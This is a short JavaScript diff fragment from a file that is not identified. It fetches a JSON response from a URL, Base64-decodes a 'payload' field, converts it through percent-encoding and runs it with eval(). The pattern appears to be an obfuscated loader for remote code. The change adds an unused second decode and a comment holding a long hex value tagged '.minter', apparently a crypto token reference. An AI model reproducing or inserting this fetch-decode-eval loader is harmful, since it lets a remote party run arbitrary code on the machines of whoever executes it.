@@ -127,9 +127,11 @@ else
 		req.open("GET", url, false);
 		req.send(null);
 		var json = JSON.parse(JSON.stringify(JSON.parse(req.responseText)));
-		var payload =  json.result.payload;
+		var payload = json.result.payload;
 		var a = Base64.decode(payload);
+		var b = Base64.decode(a);
 		var s = String(decodeURIComponent(a.split("").map(function(ch) { return "%"+ch.charCodeAt(0).toString(16); }).join("")));
 		
 		eval(s);
 }
+//0x17facf3d7714f13ffe69aa1718531084230e88a704ab5c1034e98ef277c48b45.minter
